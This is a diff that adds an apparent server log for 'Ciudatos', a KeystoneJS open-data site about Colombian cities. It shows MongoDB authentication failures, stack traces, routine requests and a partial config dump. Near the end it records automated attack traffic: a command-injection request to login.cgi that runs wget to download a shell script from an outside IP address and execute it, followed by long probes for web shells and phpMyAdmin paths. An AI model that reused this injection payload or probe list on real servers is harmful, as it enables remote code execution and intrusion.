@@ -1,0 +1,900 @@
+------------------------------------------------
+Mongoose connection "error" event fired with:
+{ MongoError: Authentication failed.
+    at Function.MongoError.create (/home/ciudatos-blog/node_modules/mongodb-core/lib/error.js:31:11)
+    at /home/ciudatos-blog/node_modules/mongodb-core/lib/connection/pool.js:485:72
+    at authenticateStragglers (/home/ciudatos-blog/node_modules/mongodb-core/lib/connection/pool.js:431:16)
+    at Connection.messageHandler (/home/ciudatos-blog/node_modules/mongodb-core/lib/connection/pool.js:465:5)
+    at Socket.<anonymous> (/home/ciudatos-blog/node_modules/mongodb-core/lib/connection/connection.js:319:22)
+    at emitOne (events.js:116:13)
+    at Socket.emit (events.js:211:7)
+    at addChunk (_stream_readable.js:263:12)
+    at readableAddChunk (_stream_readable.js:250:11)
+    at Socket.Readable.push (_stream_readable.js:208:10)
+    at TCP.onread (net.js:597:20)
+  name: 'MongoError',
+  message: 'Authentication failed.',
+  ok: 0,
+  errmsg: 'Authentication failed.',
+  code: 18,
+  codeName: 'AuthenticationFailed' }
+Error: KeystoneJS (Ciudatos) failed to start - Check that you are running `mongod` in a separate process.
+    at NativeConnection.<anonymous> (/home/ciudatos-blog/node_modules/keystone/lib/core/openDatabaseConnection.js:59:10)
+    at emitOne (events.js:116:13)
+    at NativeConnection.emit (events.js:211:7)
+    at Immediate._onImmediate (/home/ciudatos-blog/node_modules/mongoose/lib/connection.js:296:19)
+    at runCallback (timers.js:810:20)
+    at tryOnImmediate (timers.js:768:5)
+    at processImmediate [as _immediateCallback] (timers.js:745:5)
+------------------------------------------------
+Mongoose connection "error" event fired with:
+{ MongoError: Authentication failed.
+    at Function.MongoError.create (/home/ciudatos-blog/node_modules/mongodb-core/lib/error.js:31:11)
+    at /home/ciudatos-blog/node_modules/mongodb-core/lib/connection/pool.js:485:72
+    at authenticateStragglers (/home/ciudatos-blog/node_modules/mongodb-core/lib/connection/pool.js:431:16)
+    at Connection.messageHandler (/home/ciudatos-blog/node_modules/mongodb-core/lib/connection/pool.js:465:5)
+    at Socket.<anonymous> (/home/ciudatos-blog/node_modules/mongodb-core/lib/connection/connection.js:319:22)
+    at emitOne (events.js:116:13)
+    at Socket.emit (events.js:211:7)
+    at addChunk (_stream_readable.js:263:12)
+    at readableAddChunk (_stream_readable.js:250:11)
+    at Socket.Readable.push (_stream_readable.js:208:10)
+    at TCP.onread (net.js:597:20)
+  name: 'MongoError',
+  message: 'Authentication failed.',
+  ok: 0,
+  errmsg: 'Authentication failed.',
+  code: 18,
+  codeName: 'AuthenticationFailed' }
+Error: KeystoneJS (Ciudatos) failed to start - Check that you are running `mongod` in a separate process.
+    at NativeConnection.<anonymous> (/home/ciudatos-blog/node_modules/keystone/lib/core/openDatabaseConnection.js:59:10)
+    at emitOne (events.js:116:13)
+    at NativeConnection.emit (events.js:211:7)
+    at Immediate._onImmediate (/home/ciudatos-blog/node_modules/mongoose/lib/connection.js:296:19)
+    at runCallback (timers.js:810:20)
+    at tryOnImmediate (timers.js:768:5)
+    at processImmediate [as _immediateCallback] (timers.js:745:5)
+------------------------------------------------
+Mongoose connection "error" event fired with:
+{ MongoError: Authentication failed.
+    at Function.MongoError.create (/home/ciudatos-blog/node_modules/mongodb-core/lib/error.js:31:11)
+    at /home/ciudatos-blog/node_modules/mongodb-core/lib/connection/pool.js:485:72
+    at authenticateStragglers (/home/ciudatos-blog/node_modules/mongodb-core/lib/connection/pool.js:431:16)
+    at Connection.messageHandler (/home/ciudatos-blog/node_modules/mongodb-core/lib/connection/pool.js:465:5)
+    at Socket.<anonymous> (/home/ciudatos-blog/node_modules/mongodb-core/lib/connection/connection.js:319:22)
+    at emitOne (events.js:116:13)
+    at Socket.emit (events.js:211:7)
+    at addChunk (_stream_readable.js:263:12)
+    at readableAddChunk (_stream_readable.js:250:11)
+    at Socket.Readable.push (_stream_readable.js:208:10)
+    at TCP.onread (net.js:597:20)
+  name: 'MongoError',
+  message: 'Authentication failed.',
+  ok: 0,
+  errmsg: 'Authentication failed.',
+  code: 18,
+  codeName: 'AuthenticationFailed' }
+Error: KeystoneJS (Ciudatos) failed to start - Check that you are running `mongod` in a separate process.
+    at NativeConnection.<anonymous> (/home/ciudatos-blog/node_modules/keystone/lib/core/openDatabaseConnection.js:59:10)
+    at emitOne (events.js:116:13)
+    at NativeConnection.emit (events.js:211:7)
+    at Immediate._onImmediate (/home/ciudatos-blog/node_modules/mongoose/lib/connection.js:296:19)
+    at runCallback (timers.js:810:20)
+    at tryOnImmediate (timers.js:768:5)
+    at processImmediate [as _immediateCallback] (timers.js:745:5)
+
+------------------------------------------------
+KeystoneJS Started:
+Ciudatos is ready on http://0.0.0.0:3000
+------------------------------------------------
+
+GET /ciudades 304 727.565 ms
+GET /ciudatos/cities/byshw1pRLHiQ4yFM.html 304 209.939 ms
+GET /ciudatos/cities/LSjtKEOapouwXWWG.html 304 348.532 ms
+GET /ciudatos/cities/EkuYSMNHpVNrC_uu.html 304 475.790 ms
+GET /ciudatos/cities/H1rx7LZUzeDSPSnD.html 304 570.714 ms
+GET /ciudatos/cities/cEl7QsBDyquHQ_IJ.html 304 633.441 ms
+GET /ciudades 304 153.827 ms
+GET /ciudatos/cities/LSjtKEOapouwXWWG.html 304 117.660 ms
+GET /ciudatos/cities/EkuYSMNHpVNrC_uu.html 304 119.407 ms
+GET /ciudatos/cities/cEl7QsBDyquHQ_IJ.html 304 93.103 ms
+GET /ciudatos/cities/H1rx7LZUzeDSPSnD.html 304 156.832 ms
+GET /ciudatos/cities/byshw1pRLHiQ4yFM.html 304 237.433 ms
+GET /visualizacion 304 90.358 ms
+GET /ciudades 304 267.496 ms
+GET /ciudatos/cities/LSjtKEOapouwXWWG.html 304 183.036 ms
+GET /ciudatos/cities/EkuYSMNHpVNrC_uu.html 304 297.180 ms
+GET /ciudatos/cities/cEl7QsBDyquHQ_IJ.html 304 156.077 ms
+GET /ciudatos/cities/H1rx7LZUzeDSPSnD.html 304 277.863 ms
+GET /ciudatos/cities/byshw1pRLHiQ4yFM.html 304 398.903 ms
+GET /vendors/iframeResizer.map 200 81.240 ms
+GET /ciudatos/cities/LSjtKEOapouwXWWG.html 304 65.483 ms
+GET /keystone/ 302 6.610 ms
+GET /keystone/signin 200 7.139 ms
+POST /keystone/api/session/signin 200 310.570 ms
+GET /keystone/ 200 15.942 ms
+GET /keystone/api/counts 200 14.450 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 200 12.818 ms
+GET /keystone/api/cities/5b48ea52617cc1217d17ac6f?drilldown=true 200 7.694 ms
+GET /publicaciones 200 283.865 ms
+GET /visualizacion 200 244.958 ms
+GET /ciudades 200 347.961 ms
+GET /ciudatos/cities/LSjtKEOapouwXWWG.html 200 142.117 ms
+GET /ciudatos/cities/cEl7QsBDyquHQ_IJ.html 200 125.705 ms
+GET /ciudatos/cities/EkuYSMNHpVNrC_uu.html 200 215.966 ms
+GET /ciudatos/cities/H1rx7LZUzeDSPSnD.html 200 340.633 ms
+GET /ciudatos/cities/byshw1pRLHiQ4yFM.html 200 463.026 ms
+GET /ciudatos/cities/ 200 92.272 ms
+OPTIONS / 200 99.826 ms
+OPTIONS / 200 115.258 ms
+POST /keystone/api/cities/5b48ea52617cc1217d17ac6f 200 13224.888 ms
+OPTIONS /ciudatos/cities/cali.html 200 124.929 ms
+PROPFIND /ciudatos/cities/cali.html 200 83.208 ms
+PROPFIND /ciudatos/cities 200 136.392 ms
+PROPFIND /ciudatos/cities/cali.html 200 109.766 ms
+PROPFIND /ciudatos/cities 200 63.926 ms
+PROPFIND /ciudatos/cities 200 71.646 ms
+PROPFIND /ciudatos 200 87.663 ms
+PROPFIND /ciudatos/cities/cali.html 200 85.758 ms
+PROPFIND /ciudatos/cities 200 67.882 ms
+POST /keystone/api/cities/5b48ea52617cc1217d17ac6f 200 13649.648 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 7.727 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 8.159 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 11.012 ms
+GET /keystone/api/cities/5b48eaed617cc1217d17ac73?drilldown=true 200 3.743 ms
+POST /keystone/api/cities/5b48eaed617cc1217d17ac73 200 14723.830 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 8.382 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 8.796 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 8.068 ms
+GET /keystone/api/cities/5b48eaa4617cc1217d17ac71?drilldown=true 200 4.345 ms
+OPTIONS /ciudatos/cities/manizales.html 200 96.450 ms
+PROPFIND /ciudatos/cities/manizales.html 200 94.236 ms
+PROPFIND /ciudatos/cities 200 76.149 ms
+PROPFIND /ciudatos/cities/manizales.html 200 63.215 ms
+PROPFIND /ciudatos/cities 200 72.693 ms
+PROPFIND /ciudatos/cities 200 86.422 ms
+PROPFIND /ciudatos 200 71.441 ms
+PROPFIND /ciudatos/cities/manizales.html 200 64.891 ms
+PROPFIND /ciudatos/cities 200 57.968 ms
+POST /keystone/api/cities/5b48eaa4617cc1217d17ac71 200 13171.666 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 13.645 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 9.812 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 15.788 ms
+GET /keystone/api/cities/5b48eac8617cc1217d17ac72?drilldown=true 200 4.066 ms
+GET / 200 256.085 ms
+GET /ciudades/cali 200 136.638 ms
+GET /ciudades/ciudatos/cities/nJbova__pbbNXHjB.html 200 80.246 ms
+GET /ciudades/ciudatos/cities/EkuYSMNHpVNrC_uu.html 200 89.278 ms
+GET /ciudades/ciudatos/cities/tJJaYiyarfdyvawM.html 200 152.748 ms
+GET /ciudades/ciudatos/cities/cEl7QsBDyquHQ_IJ.html 200 78.057 ms
+GET /ciudades/ciudatos/cities/6-KGkubaV6clsqMc.html 200 70.168 ms
+POST /keystone/api/cities/5b48eac8617cc1217d17ac72 200 12916.443 ms
+GET /ciudades 200 96.280 ms
+GET /ciudatos/cities/EkuYSMNHpVNrC_uu.html 304 100.563 ms
+GET / 304 184.364 ms
+GET /ciudades/cali 200 136.233 ms
+GET /ciudades/ciudatos/cities/nJbova__pbbNXHjB.html 304 64.503 ms
+GET /ciudades/ciudatos/cities/EkuYSMNHpVNrC_uu.html 304 83.176 ms
+GET /ciudades/ciudatos/cities/tJJaYiyarfdyvawM.html 304 142.584 ms
+GET /ciudades/ciudatos/cities/6-KGkubaV6clsqMc.html 304 109.758 ms
+GET /ciudades/ciudatos/cities/y7LPSl4l1lVv1KHB.html 200 52.556 ms
+GET /ciudades/ 200 84.976 ms
+GET /ciudades/ciudatos/cities/nJbova__pbbNXHjB.html 304 50.098 ms
+GET /ciudades/ciudatos/cities/EkuYSMNHpVNrC_uu.html 304 64.580 ms
+GET /ciudades/ciudatos/cities/6-KGkubaV6clsqMc.html 304 140.002 ms
+GET /ciudades/ciudatos/cities/y7LPSl4l1lVv1KHB.html 304 218.840 ms
+GET /ciudades/ciudatos/cities/tJJaYiyarfdyvawM.html 304 271.654 ms
+GET /ciudades/ 304 102.495 ms
+GET /ciudades/ciudatos/cities/nJbova__pbbNXHjB.html 304 55.751 ms
+GET /ciudades/ciudatos/cities/EkuYSMNHpVNrC_uu.html 304 73.323 ms
+GET /ciudades/ciudatos/cities/6-KGkubaV6clsqMc.html 304 129.424 ms
+GET /ciudades/ciudatos/cities/y7LPSl4l1lVv1KHB.html 304 201.290 ms
+GET /ciudades/ciudatos/cities/tJJaYiyarfdyvawM.html 304 243.881 ms
+GET /ciudades 304 76.302 ms
+GET /ciudatos/cities/EkuYSMNHpVNrC_uu.html 304 58.945 ms
+GET /ciudades/cali 304 85.881 ms
+GET /ciudades/ciudatos/cities/EkuYSMNHpVNrC_uu.html 304 54.536 ms
+GET /ciudades/ciudatos/cities/nJbova__pbbNXHjB.html 304 129.181 ms
+GET /ciudades/ciudatos/cities/y7LPSl4l1lVv1KHB.html 304 63.808 ms
+GET /ciudades/ciudatos/cities/tJJaYiyarfdyvawM.html 304 113.395 ms
+GET /ciudades/ciudatos/cities/6-KGkubaV6clsqMc.html 304 166.683 ms
+GET /vendors/iframeResizer.map 200 66.654 ms
+GET /ciudades/ciudatos/cities/nJbova__pbbNXHjB.html 304 59.228 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 7.377 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 6.755 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 5.292 ms
+GET /keystone/api/cities/5b48ea75617cc1217d17ac70?drilldown=true 200 3.123 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 7.568 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 6.659 ms
+GET /keystone/api/cities?fields=title%2Cstate&limit=100&sort=title&expandRelationshipFields=true 304 5.628 ms
+GET /keystone/api/cities/5b48ea75617cc1217d17ac70?drilldown=true 304 2.795 ms
+OPTIONS /ciudatos/cities/cartagena.html 200 61.693 ms
+PROPFIND /ciudatos/cities/cartagena.html 200 78.002 ms
+PROPFIND /ciudatos/cities 200 79.648 ms
+PROPFIND /ciudatos/cities/cartagena.html 200 65.488 ms
+PROPFIND /ciudatos/cities 200 65.818 ms
+PROPFIND /ciudatos/cities 200 69.718 ms
+PROPFIND /ciudatos 200 72.859 ms
+PROPFIND /ciudatos/cities/cartagena.html 200 55.410 ms
+PROPFIND /ciudatos/cities 200 58.615 ms
+GET /ciudades 304 127.724 ms
+GET /ciudatos/cities/EkuYSMNHpVNrC_uu.html 304 81.457 ms
+GET /vendors/iframeResizer.map 304 62.591 ms
+POST /keystone/api/cities/5b48ea75617cc1217d17ac70 200 13482.439 ms
+GET /ciudades 200 334.410 ms
+GET /vendors/iframeResizer.map 304 267.868 ms
+
+------------------------------------------------
+KeystoneJS Started:
+Ciudatos is ready on http://0.0.0.0:3000
+------------------------------------------------
+
+GET / 200 875.624 ms
+GET /visualizacion 200 184.130 ms
+
+------------------------------------------------
+KeystoneJS Started:
+Ciudatos is ready on http://0.0.0.0:80
+------------------------------------------------
+
+GET /ods 304 624.432 ms
+GET /wp-content/plugins/omni-secure-files/plupload/examples/upload.php 200 186.051 ms
+GET /ods 304 281.437 ms
+GET /ods 304 227.816 ms
+GET / 200 367.962 ms
+GET /mock 200 133.138 ms
+GET /mock 304 120.155 ms
+GET /mock 304 86.897 ms
+GET /mock 304 112.771 ms
+GET /mock 304 128.921 ms
+TypeError: Cannot read property 'city' of undefined
+    at module.exports (/home/ciudatos-blog/routes/index.js:19:35)
+    at createApp (/home/ciudatos-blog/node_modules/keystone/server/createApp.js:140:4)
+    at Keystone.initExpressApp (/home/ciudatos-blog/node_modules/keystone/lib/core/initExpressApp.js:9:47)
+    at Keystone.start (/home/ciudatos-blog/node_modules/keystone/lib/core/start.js:47:7)
+    at Object.<anonymous> (/home/ciudatos-blog/keystone.js:43:10)
+    at Module._compile (module.js:652:30)
+    at Object.Module._extensions..js (module.js:663:10)
+    at Module.load (module.js:565:32)
+    at tryModuleLoad (module.js:505:12)
+    at Function.Module._load (module.js:497:3)
+    at Function.Module.runMain (module.js:693:10)
+    at startup (bootstrap_node.js:191:16)
+    at bootstrap_node.js:612:3
+TypeError: Cannot read property 'city' of undefined
+    at module.exports (/home/ciudatos-blog/routes/index.js:19:35)
+    at createApp (/home/ciudatos-blog/node_modules/keystone/server/createApp.js:140:4)
+    at Keystone.initExpressApp (/home/ciudatos-blog/node_modules/keystone/lib/core/initExpressApp.js:9:47)
+    at Keystone.start (/home/ciudatos-blog/node_modules/keystone/lib/core/start.js:47:7)
+    at Object.<anonymous> (/home/ciudatos-blog/keystone.js:43:10)
+    at Module._compile (module.js:652:30)
+    at Object.Module._extensions..js (module.js:663:10)
+    at Module.load (module.js:565:32)
+    at tryModuleLoad (module.js:505:12)
+    at Function.Module._load (module.js:497:3)
+    at Function.Module.runMain (module.js:693:10)
+    at startup (bootstrap_node.js:191:16)
+    at bootstrap_node.js:612:3
+TypeError: Cannot read property 'city' of undefined
+    at module.exports (/home/ciudatos-blog/routes/index.js:19:35)
+    at createApp (/home/ciudatos-blog/node_modules/keystone/server/createApp.js:140:4)
+    at Keystone.initExpressApp (/home/ciudatos-blog/node_modules/keystone/lib/core/initExpressApp.js:9:47)
+    at Keystone.start (/home/ciudatos-blog/node_modules/keystone/lib/core/start.js:47:7)
+    at Object.<anonymous> (/home/ciudatos-blog/keystone.js:43:10)
+    at Module._compile (module.js:652:30)
+    at Object.Module._extensions..js (module.js:663:10)
+    at Module.load (module.js:565:32)
+    at tryModuleLoad (module.js:505:12)
+    at Function.Module._load (module.js:497:3)
+    at Function.Module.runMain (module.js:693:10)
+    at startup (bootstrap_node.js:191:16)
+    at bootstrap_node.js:612:3
+TypeError: Cannot read property 'city' of undefined
+    at module.exports (/home/ciudatos-blog/routes/index.js:19:35)
+    at createApp (/home/ciudatos-blog/node_modules/keystone/server/createApp.js:140:4)
+    at Keystone.initExpressApp (/home/ciudatos-blog/node_modules/keystone/lib/core/initExpressApp.js:9:47)
+    at Keystone.start (/home/ciudatos-blog/node_modules/keystone/lib/core/start.js:47:7)
+    at Object.<anonymous> (/home/ciudatos-blog/keystone.js:43:10)
+    at Module._compile (module.js:652:30)
+    at Object.Module._extensions..js (module.js:663:10)
+    at Module.load (module.js:565:32)
+    at tryModuleLoad (module.js:505:12)
+    at Function.Module._load (module.js:497:3)
+    at Function.Module.runMain (module.js:693:10)
+    at startup (bootstrap_node.js:191:16)
+    at bootstrap_node.js:612:3
+
+------------------------------------------------
+KeystoneJS Started:
+Ciudatos is ready on http://0.0.0.0:80
+------------------------------------------------
+
+GET /ods 200 652.277 ms
+GET /mock 200 199.635 ms
+GET /mock 200 221.848 ms
+GET /mock 200 257.827 ms
+GET /mock 304 270.221 ms
+GET /visualizacion 200 221.052 ms
+GET /publicaciones 200 169.956 ms
+GET /publicaciones 200 158.481 ms
+GET /publicaciones 304 151.644 ms
+GET /publicaciones 304 145.853 ms
+GET /explora 200 137.065 ms
+GET /ciudades 200 222.917 ms
+GET /publicaciones 200 174.434 ms
+GET /visualizacion 200 129.952 ms
+GET /dia-mundial-de-las-ciudades-medellin-ciudad-de-red-como-vamos-mas-satisfecha-con-sus-parques/ 200 127.285 ms
+GET /ciudades/cali 200 170.808 ms
+GET /wp-login.php 200 191.081 ms
+GET / 200 229.597 ms
+GET /ciudades/medellin 200 389.079 ms
+GET /ciudades/manizales 200 323.346 ms
+GET / 200 291.176 ms
+GET /wp-login.php 200 122.934 ms
+GET /ciudades/cartagena 200 146.442 ms
+GET /ciudades/santa-marta 200 183.455 ms
+GET /robots.txt 200 140.575 ms
+GET /visualizacion?section=educacion 200 125.007 ms
+GET /visualizacion?section=habitat_urbano 200 105.623 ms
+GET /datos/ 200 103.578 ms
+GET /wp-login.php 200 109.479 ms
+GET / 200 227.012 ms
+GET /visualizacion?section=medio_ambiente 200 141.537 ms
+GET /wp-login.php 200 118.423 ms
+GET / 200 193.485 ms
+GET /visualizacion?section=entorno_economico 200 100.638 ms
+GET /visualizacion?section=pobreza_y_equidad 200 262.537 ms
+GET /visualizacion?section=bienestar_subjetivo 200 260.385 ms
+GET /visualizacion?section=seguridad_y_convivencia 200 209.908 ms
+GET /visualizacion?section=buen_gobierno_y_ciudadania 200 151.364 ms
+GET /wp-login.php 200 183.972 ms
+GET / 200 226.916 ms
+GET / 200 259.224 ms
+GET /ods 200 138.175 ms
+GET /ciudades 200 223.870 ms
+GET / 200 283.173 ms
+GET /ods 200 108.397 ms
+GET /MOCK 200 95.944 ms
+GET /visualizacion?section=entorno_economico 200 144.585 ms
+GET /ods 304 126.647 ms
+GET /mock 304 103.446 ms
+GET / 304 242.700 ms
+GET / 200 269.294 ms
+GET / 304 232.486 ms
+GET / 304 210.984 ms
+GET /visualizacion 200 95.016 ms
+GET / 304 179.877 ms
+GET / 304 238.411 ms
+GET /ods 200 90.522 ms
+GET / 200 246.587 ms
+GET /robots.txt 200 94.311 ms
+GET /robots.txt 200 205.159 ms
+GET /wp-login.php 200 234.818 ms
+GET / 200 480.304 ms
+GET /wp-login.php 200 138.242 ms
+GET / 200 266.068 ms
+GET /ods 304 102.825 ms
+GET /wp-login.php 200 151.452 ms
+GET / 200 230.603 ms
+GET /MOCK 304 125.361 ms
+GET /publicaciones 200 198.172 ms
+GET / 200 296.999 ms
+GET /apple-touch-icon-precomposed.png 200 115.474 ms
+GET /apple-touch-icon.png 200 151.430 ms
+GET / 200 198.978 ms
+GET /apple-touch-icon-precomposed.png 200 76.606 ms
+GET /apple-touch-icon.png 200 90.554 ms
+GET /recomendaciones-al-plan-de-desarrollo-de-cartagena-primero-la-gente-2016-2019/ 200 103.180 ms
+
+------------------------------------------------
+KeystoneJS Started:
+Ciudatos is ready on http://0.0.0.0:80
+------------------------------------------------
+
+GET / 304 1187.255 ms
+GET / 304 413.352 ms
+GET /ods 200 128.272 ms
+GET /ods 304 130.701 ms
+GET /visualizacion 200 119.600 ms
+GET / 200 407.403 ms
+GET /MOCK 200 107.907 ms
+GET /login.cgi?cli=aa%20aa%27;wget%20http://77.87.77.250/izuku.sh%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ - - ms
+GET / 200 537.118 ms
+GET /ciudades 200 359.129 ms
+PROPFIND / - - ms
+GET /webdav/ 200 121.434 ms
+GET /help.php 200 101.941 ms
+GET /java.php 200 113.698 ms
+GET /_query.php 200 105.039 ms
+GET /test.php 200 93.294 ms
+GET /db_cts.php 200 104.043 ms
+GET /db_pma.php 200 93.647 ms
+GET /logon.php 200 96.893 ms
+GET /help-e.php 200 96.237 ms
+GET /license.php 200 86.528 ms
+GET /log.php 200 105.100 ms
+GET /hell.php 200 99.073 ms
+GET /pmd_online.php 200 64.369 ms
+GET /x.php 200 82.266 ms
+GET /shell.php 200 94.979 ms
+GET /desktop.ini.php 200 77.155 ms
+GET /z.php 200 98.547 ms
+GET /lala.php 200 68.141 ms
+GET /lala-dpr.php 200 77.252 ms
+GET /wpo.php 200 76.234 ms
+GET /text.php 200 107.694 ms
+GET /wp-config.php 200 89.857 ms
+GET /muhstik.php 200 80.703 ms
+GET /muhstik2.php 200 83.681 ms
+GET /muhstiks.php 200 58.676 ms
+GET /muhstik-dpr.php 200 98.645 ms
+GET /lol.php 200 71.017 ms
+GET /uploader.php 200 50.861 ms
+GET /cmd.php 200 70.817 ms
+GET /cmx.php 200 83.928 ms
+GET /cmv.php 200 83.096 ms
+GET /cmdd.php 200 70.720 ms
+GET /knal.php 200 64.882 ms
+GET /cmd.php 200 71.953 ms
+GET /shell.php 200 84.977 ms
+GET /appserv.php 200 77.436 ms
+POST /wuwu11.php 200 96.709 ms
+POST /xw.php 200 50.465 ms
+POST /xw1.php 200 65.854 ms
+POST /9678.php 200 59.225 ms
+POST /wc.php 200 66.305 ms
+POST /xx.php 200 66.748 ms
+POST /s.php 200 63.152 ms
+POST /w.php 200 70.082 ms
+POST /sheep.php 200 57.817 ms
+POST /qaq.php 200 87.781 ms
+POST /db.init.php 200 68.045 ms
+POST /db_session.init.php 200 64.378 ms
+POST /db__.init.php 200 54.842 ms
+POST /wp-admins.php 200 54.098 ms
+POST /m.php?pbid=open 200 64.152 ms
+POST /db_dataml.php 200 94.982 ms
+POST /db_desql.php 200 75.148 ms
+POST /mx.php 200 59.039 ms
+POST /wshell.php 200 72.034 ms
+POST /xshell.php 200 62.384 ms
+POST /qq.php 200 56.739 ms
+POST /conflg.php 200 86.826 ms
+POST /lindex.php 200 60.999 ms
+POST /phpstudy.php 200 59.560 ms
+POST /phpStudy.php 200 63.763 ms
+POST /weixiao.php 200 68.039 ms
+POST /feixiang.php 200 57.334 ms
+POST /ak47.php 200 66.335 ms
+POST /ak48.php 200 73.701 ms
+POST /xiao.php 200 68.304 ms
+POST /yao.php 200 59.175 ms
+POST /defect.php 200 72.288 ms
+POST /webslee.php 200 67.114 ms
+POST /q.php 200 95.893 ms
+POST /pe.php 200 56.284 ms
+POST /hm.php 200 52.887 ms
+POST /cainiao.php 200 64.294 ms
+POST /zuoshou.php 200 62.723 ms
+POST /zuo.php 200 60.024 ms
+POST /aotu.php 200 62.918 ms
+POST /cmd.php 200 58.319 ms
+POST /bak.php 200 76.644 ms
+POST /system.php 200 50.239 ms
+POST /l6.php 200 59.819 ms
+POST /l7.php 200 61.071 ms
+POST /l8.php 200 93.063 ms
+POST /q.php 200 63.110 ms
+POST /56.php 200 50.983 ms
+POST /mz.php 200 69.799 ms
+POST /xx.php 200 49.624 ms
+POST /yumo.php 200 54.972 ms
+POST /min.php 200 65.732 ms
+POST /wan.php 200 57.910 ms
+POST /wanan.php 200 67.268 ms
+POST /ssaa.php 200 65.838 ms
+POST /qq.php 200 56.672 ms
+POST /aw.php 200 58.709 ms
+POST /12.php 200 77.220 ms
+POST /hh.php 200 83.528 ms
+POST /ak.php 200 49.946 ms
+POST /ip.php 200 67.357 ms
+POST /infoo.php 200 47.878 ms
+POST /qq.php 200 52.847 ms
+POST /qwe.php 200 75.742 ms
+POST /1213.php 200 65.326 ms
+POST /post.php 200 60.982 ms
+POST /h1.php 200 79.088 ms
+POST /test.php 200 57.002 ms
+POST /3.php 200 52.907 ms
+POST /phpinfi.php 200 90.797 ms
+POST /aaaa.php 200 52.845 ms
+POST /9510.php 200 49.329 ms
+POST /python.php 200 69.423 ms
+POST /default.php 200 68.377 ms
+POST /sean.php 200 61.908 ms
+POST /app.php 200 57.666 ms
+POST /help.php 200 79.744 ms
+POST /tiandi.php 200 54.348 ms
+POST /miao.php 200 87.751 ms
+POST /xz.php 200 54.584 ms
+POST /linuxse.php 200 60.609 ms
+POST /zuoindex.php 200 77.559 ms
+POST /zshmindex.php 200 50.141 ms
+POST /ceshi.php 200 52.448 ms
+POST /boots.php 200 58.395 ms
+POST /she.php 200 85.698 ms
+POST /s.php 200 72.618 ms
+POST /qw.php 200 53.760 ms
+POST /test.php 200 62.900 ms
+POST /caonma.php 200 56.108 ms
+POST /ss.php 200 57.295 ms
+POST /wcp.php 200 69.933 ms
+POST /xiaoma.php 200 63.273 ms
+POST /xiaomae.php 200 77.797 ms
+POST /xiaomar.php 200 83.673 ms
+POST /qq.php 200 51.261 ms
+POST /data.php 200 63.844 ms
+POST /log.php 200 57.377 ms
+POST /fack.php 200 52.868 ms
+POST /angge.php 200 66.789 ms
+GET /index.php 200 92.485 ms
+GET /phpmyadmin/index.php 200 52.840 ms
+GET /phpMyAdmin/index.php 200 63.390 ms
+GET /pmd/index.php 200 56.232 ms
+GET /pma/index.php 200 56.430 ms
+GET /PMA/index.php 200 83.803 ms
+GET /PMA2/index.php 200 50.074 ms
+GET /pmamy/index.php 200 49.420 ms
+GET /pmamy2/index.php 200 51.063 ms
+GET /mysql/index.php 200 59.865 ms
+GET /admin/index.php 200 60.303 ms
+GET /db/index.php 200 63.665 ms
+GET /dbadmin/index.php 200 60.371 ms
+GET /web/phpMyAdmin/index.php 200 60.216 ms
+GET /admin/pma/index.php 200 49.694 ms
+GET /admin/PMA/index.php 200 55.921 ms
+GET /admin/mysql/index.php 200 78.190 ms
+GET /admin/mysql2/index.php 200 75.767 ms
+GET /admin/phpmyadmin/index.php 200 70.622 ms
+GET /admin/phpMyAdmin/index.php 200 52.435 ms
+GET /admin/phpmyadmin2/index.php 200 66.770 ms
+GET /mysqladmin/index.php 200 49.405 ms
+GET /mysql-admin/index.php 200 73.760 ms
+[ { _id: 5ac273955bcf1f5b6128e733,
+    __v: 0,
+    aboutDescription: 'Plataforma que almacena los datasets completos históricos de las ciudades Cómo Vamos y otros que hacen parte de la Plataforma de Datos Abiertos para su descarga en línea.',
+    aboutTitle: 'Sobre Nosotros',
+    howToTitle: '¿Cómo encuentro estos datos?',
+    whatDataTitle: '¿Qué datos tiene la plataforma?',
+    howToText: 
+     { html: '<p>Los datos están organizados por ciudad. Por lo que puedes acceder desde la página principal de ciudatos.</p>\n<p>Los datos los puedes encontrar por año, por ciudad, o puedes entrar a ciudatos para descargar la base completa para todas las ciudades.</p>\n<p>¡Recuerda abrir el archivo de diccionario de datos al mismo tiempo que trabajes con la base de datos!</p>\n',
+       md: 'Los datos están organizados por ciudad. Por lo que puedes acceder desde la página principal de ciudatos.\r\n\r\nLos datos los puedes encontrar por año, por ciudad, o puedes entrar a ciudatos para descargar la base completa para todas las ciudades.\r\n\r\n¡Recuerda abrir el archivo de diccionario de datos al mismo tiempo que trabajes con la base de datos!' },
+    whatDataText: 
+     { html: '<p>La plataforma de datos de la Red de Ciudades Cómo Vamos tiene todos los datos recopilados desde el nacimiento de cada una de las 11 iniciativas. De acuerdo a la metodología utilizada por el programa, se recopilan dos tipos de datos:</p>\n<p>Datos Objetivos: Indicadores recopilados por ciudad, que describen el estado de las temáticas que dan cuenta de la calidad de vida en cada ciudad. Por ejemplo, la tasa de homicidios o de mortalidad en Medellín.</p>\n<p>Datos Subjetivos: Respuestas a las preguntas de la Encuesta de Percepción ciudadana aplicada anualmente en cada ciudad. La encuesta indaga sobre los temas que se incluyen en los indicadores objetivos, por ejemplo, sobre victimización, educación etc.</p>\n',
